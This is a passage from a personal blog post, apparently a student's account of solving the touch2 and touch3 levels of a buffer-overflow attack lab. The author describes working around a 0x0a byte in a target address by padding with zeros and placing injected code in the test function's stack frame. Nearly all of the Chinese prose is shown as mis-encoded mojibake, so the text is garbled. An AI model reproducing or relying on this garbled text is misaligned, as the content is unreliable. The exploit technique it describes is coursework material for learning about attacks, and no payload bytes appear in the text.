</code></pre><h3 id="è®©æˆ‘å¿ƒç´¯çš„ç‚¹æ–°çš„å‘ç°">è®©æˆ‘å¿ƒç´¯çš„ç‚¹&amp;æ–°çš„å‘ç°</h3>
<p>æˆ‘é‡‡ç”¨ç½‘ä¸Šæ•™ç¨‹ï¼Œè¿‡touch2å’Œtouch3çš„æ—¶å€™ï¼Œæ–¹æ³•ç»å¯¹æ²¡é”™ï¼Œä½†æ˜¯æ°¸è¿œè¿‡ä¸äº†ã€‚å’ŒåŒå­¦è®¨è®ºè¿‡åï¼Œç¡®è®¤æˆ‘çš„æ­¥éª¤ç»å¯¹æ²¡é”™ï¼Œæˆ‘å¼€å§‹æ€€ç–‘ç»™çš„ç¨‹åºæ˜¯æœ‰bugçš„ã€‚</p>
<p>äºæ˜¯åœ¨IDAä¸Šåæ±‡ç¼–åŠ¨æ€è°ƒè¯•ï¼ˆå’Œå®¤å‹ä¸€èµ·ï¼‰ï¼Œæˆ‘çš„dockerç«¯å£æ˜ å°„æœ‰é—®é¢˜ï¼Œæ²¡åŠæ³•åŠ¨æ€è°ƒè¯•ã€‚å‘ç°ï¼šå½“GET()åˆ°æˆ‘çš„touch2åœ°å€æ—¶ï¼Œç”±äºæˆ‘å€’éœ‰ï¼Œåœ°å€é‡Œé¢æœ‰0aï¼Œè¯»åˆ°è¿™ä¸€ä½ä¹‹åä¸è¯»äº†ï¼Œçœ‹getçš„ä»£ç ï¼Œå‘ç°ç¨‹åºè¯»åˆ°10ï¼ˆ0x0aï¼‰æ—¶ï¼Œæœç„¶ä¼šbreakã€‚å…¶å®æƒ³ä¸€æƒ³ä¹Ÿèƒ½ç†è§£ï¼Œå› ä¸º0aæ˜¯æ¢è¡Œç¬¦å•Šï¼ï¼ï¼</p>
<p>æ‰€ä»¥æˆ‘ä¿®æ”¹äº†ç¨‹åºçš„æºä»£ç ï¼Œ0açš„æ—¶å€™ä¸breakï¼Œæœç„¶æœ¬åœ°é€šè¿‡ï¼Œ</p>
<p><img src="https://i.loli.net/2021/11/23/PRqgUvxEkfVHGpr.png" alt="image-20211123153846353"></p>
<p>ä½†æ˜¯è¯¾ç¨‹ç½‘ç«™ä¸Šæ˜¯invalidï¼Œæœç„¶ï¼Œç½‘ç«™ä¸ºäº†é˜²æ­¢æˆ‘ä»¬ä½œå¼Šï¼ˆä¿®æ”¹åŸä»£ç è¿‡ç¨‹åº/ç›´æ¥ä¼ªé€ è¯·æ±‚ï¼‰ï¼Œä¸èƒ½å…è®¸æˆ‘ä»¬è¿™æ ·åšã€‚</p>
<p>é‚£å’‹åŠäº†ï¼Œåªèƒ½è®©åœ°å€é‡Œé¢ä¸åŒ…å«0aäº†ï¼Œäºæ˜¯æ‰“ç®—ä½¿ç”¨æ•°æ®å°†0axxçš„æ ˆç©ºé—´å…¨éƒ¨å æ»¡ï¼Œç›´æ¥æŠŠæŒ‡ä»¤å­˜åœ¨testå‡½æ•°çš„æ ˆå¸§ä¸­ï¼šé™¤äº†å†™çš„0ç‰¹åˆ«å¤šï¼Œçœ‹åˆ°ğŸ‘€ç–¼ï¼Œç»ˆäºè¿‡äº†ã€‚ã€‚ã€‚</p>
<p>åŒæ ·çš„æ–¹æ³•è¿‡äº†touch3</p>
<p>ç­”æ¡ˆæ˜¯è¿™æ ·çš„ï¼š</p>
<p><img src="https://i.loli.net/2021/11/23/GiXE9PFzsmeBCwO.png" alt="image-20211123154424623"></p>
<p>ä¸ºäº†é€ å‡ºè¿™ä¸ªåœ°å€ï¼Œè¡¥äº†éå¸¸å¤š0</p>
<p>å®é™…ä¸Šè¿›äº†testæ ˆå¸§</p>
<p>é‚£ä¸€å¤©æœ¬æ¥æ™šä¸Š6ç‚¹å»éªŒæ”¶ï¼Œè‡ªå·±é¢„ä¼°10åˆ†é’Ÿå°±èƒ½å¼„å®Œï¼Œä¹Ÿæ²¡åƒé¥­ï¼Œæƒ³ç€éªŒæ”¶å®Œäº†ç¾ç¾åƒä¸€é¡¿ï¼Œç»“æœå› ä¸ºè¿™ä¸ªé—®é¢˜ä¸€ç›´å¼„åˆ°æ™šä¸Š10:30ï¼Œæœ€åè§£å†³äº†åƒäº†ç¢—æ³¡é¢ã€‚ã€‚ã€‚ã€‚</p>
<p>å…³é”®æ˜¯åˆ«çš„åŒå­¦éƒ½æ²¡è¿™ä¸ªé—®é¢˜ï¼Œæˆ‘æ­£å¥½éšåˆ°è¿™ä¸ªåœ°å€ï¼Œå½“æ—¶è§‰å¾—è‡ªå·±ç‰¹åˆ«å€’éœ‰ï¼Œç°åœ¨æƒ³æƒ³å…¶å®è¿˜å¥½ã€‚</p>
<p>å¼€è¾Ÿå‡ºäº†ä¸€ç§æ–°çš„æ–¹æ³•ï¼Œä¹Ÿå¯¹è¿™ä¸ªæ”»å‡»çš„äº†è§£æ›´åŠ æ·±åˆ»äº†ã€‚</p>
</div>
	</section>


</article>

		</main>
		<div class="w-full h-0 flex-none order-3"></div>
		<aside role="contentinfo"
			class="w-full md:w-2/5 xl:w-1/2 md:pr-12 lg:pr-20 xl:pr-24 order-4 md:order-3 md:sticky md:bottom-0 self-end max-w-2xl">
			<div class="md:float-right md:text-right leading-loose tracking-tight md:mb-2">
				
	<div class="md:max-w-xs  flex flex-col md:items-end">
	<ul class="font-serif flex-grow-0 flex justify-between flex-wrap md:flex-col">
	
	
	<li class="px-1 md:px-0">
		<a href="/liferecord/" title="LifeRecord page" >
			LifeRecord
		</a>
	</li>
	
	<li class="px-1 md:px-0">
		<a href="/studynotes/" title="StudyNotes page" 
			class="font-medium text-medium-red-violet-600 hover:text-medium-red-violet-400" >
			StudyNotes
		</a>
	</li>
	
	<li class="px-1 md:px-0">
		<a href="/techthinking/" title="TechThinking page" >
			TechThinking
		</a>
	</li>
	
	<li class="px-1 md:px-0">
		<a href="/readpapers/" title="ReadPapers page" >
			ReadPapers
		</a>
	</li>
	
	<li class="px-1 md:px-0">
		<a href="/literatureart/" title="Literature&amp;Art page" >
			Literature&amp;Art
		</a>
	</li>
	
	
	
	
</ul>
	

<div class="flex flex-wrap-reverse md:justify-end content-end md:content-start justify-start items-start   max-h-16">
	
	<a href='https://github.com/weivwang' target="_blank" class="github icon pl-1 text-eucalyptus-400 hover:text-java-400" title="github link" rel="noopener"
		aria-label="follow on githubâ€”â€”Opens in a new window">
		
		<div class="fill-current h-8 w-8">
			<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
    <g>
        <path fill="none" d="M0 0h24v24H0z"/>
        <path fill-rule="nonzero" d="M5.883 18.653c-.3-.2-.558-.455-.86-.816a50.32 50.32 0 0 1-.466-.579c-.463-.575-.755-.84-1.057-.949a1 1 0 0 1 .676-1.883c.752.27 1.261.735 1.947 1.588-.094-.117.34.427.433.539.19.227.33.365.44.438.204.137.587.196 1.15.14.023-.382.094-.753.202-1.095C5.38 15.31 3.7 13.396 3.7 9.64c0-1.24.37-2.356 1.058-3.292-.218-.894-.185-1.975.302-3.192a1 1 0 0 1 .63-.582c.081-.024.127-.035.208-.047.803-.123 1.937.17 3.415 1.096A11.731 11.731 0 0 1 12 3.315c.912 0 1.818.104 2.684.308 1.477-.933 2.613-1.226 3.422-1.096.085.013.157.03.218.05a1 1 0 0 1 .616.58c.487 1.216.52 2.297.302 3.19.691.936 1.058 2.045 1.058 3.293 0 3.757-1.674 5.665-4.642 6.392.125.415.19.879.19 1.38a300.492 300.492 0 0 1-.012 2.716 1 1 0 0 1-.019 1.958c-1.139.228-1.983-.532-1.983-1.525l.002-.446.005-.705c.005-.708.007-1.338.007-1.998 0-.697-.183-1.152-.425-1.36-.661-.57-.326-1.655.54-1.752 2.967-.333 4.337-1.482 4.337-4.66 0-.955-.312-1.744-.913-2.404a1 1 0 0 1-.19-1.045c.166-.414.237-.957.096-1.614l-.01.003c-.491.139-1.11.44-1.858.949a1 1 0 0 1-.833.135A9.626 9.626 0 0 0 12 5.315c-.89 0-1.772.119-2.592.35a1 1 0 0 1-.83-.134c-.752-.507-1.374-.807-1.868-.947-.144.653-.073 1.194.092 1.607a1 1 0 0 1-.189 1.045C6.016 7.89 5.7 8.694 5.7 9.64c0 3.172 1.371 4.328 4.322 4.66.865.097 1.201 1.177.544 1.748-.192.168-.429.732-.429 1.364v3.15c0 .986-.835 1.725-1.96 1.528a1 1 0 0 1-.04-1.962v-.99c-.91.061-1.662-.088-2.254-.485z"/>
    </g>
</svg>

		</div>
	</a>
	
</div>
	<div class="text-sm text-gray-500 leading-tight a-gray">
		
		<br />
		Built with Hugo and theme <a href="https://github.com/heyeshuang/hugo-theme-tokiwa">Tokiwa</a>. 1255 words in this page.
	</div>
</div>

			</div>
		</aside>
		<footer class="w-full md:w-3/5 xl:w-1/2 order-3 max-w-3xl md:order-4 pt-2">
			
<hr class="double-line" />
<div class="flex flex-wrap justify-between pb-2 leading-loose font-serif">
    
    <a class="flex-grow-0" href="/techthinking/business_model_canvas/">
        <svg class="fill-current inline-block h-4 w-4" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="24"
            height="24">
            <path fill="none" d="M0 0h24v24H0z" />
            <path d="M7.828 11H20v2H7.828l5.364 5.364-1.414 1.414L4 12l7.778-7.778 1.414 1.414z" /></svg>
        Business_model_canvas
    </a>
    
    
    <a class="flex-grow-0" href="/studynotes/%E5%95%86%E5%8A%A1%E6%99%BA%E8%83%BD%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0/">
        å•†åŠ¡æ™ºèƒ½è¯¾å ‚ç¬”è®°
        <svg class="fill-current inline-block h-4 w-4" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="24"
            height="24">
            <path fill="none" d="M0 0h24v24H0z" />
            <path d="M16.172 11l-5.364-5.364 1.414-1.414L20 12l-7.778 7.778-1.414-1.414L16.172 13H4v-2z" /></svg></a>
    
</div>
<div >



</div>
<hr />
<div class="pb-2">
    
</div>
<hr />

		</footer>
		

<script src="/dist/app.js"></script>


	</div>
</body>

</html>
